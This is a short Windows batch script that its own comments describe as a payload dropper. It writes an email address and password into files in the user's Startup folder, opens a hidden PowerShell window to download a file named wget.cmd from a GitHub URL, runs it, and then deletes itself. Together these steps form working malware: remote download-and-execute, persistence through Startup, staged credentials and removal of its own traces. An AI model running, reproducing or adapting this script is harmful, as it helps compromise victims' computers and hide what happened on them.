@echo off

@REM credentials - CHANGE ME
set "email=example@gmail.com"
set "eword=key"

@REM variables
set "var=%cd%"
set "startup=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into startup directory
cd %startup%
echo %email% > email.txt
echo %eword% > eword.txt

@REM write payload to startup
powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/wget.cmd -OutFile wget.cmd"

@REM run payload
powershell ./wget.cmd 

@REM cd back into initial location
cd %var%
del initial.cmd
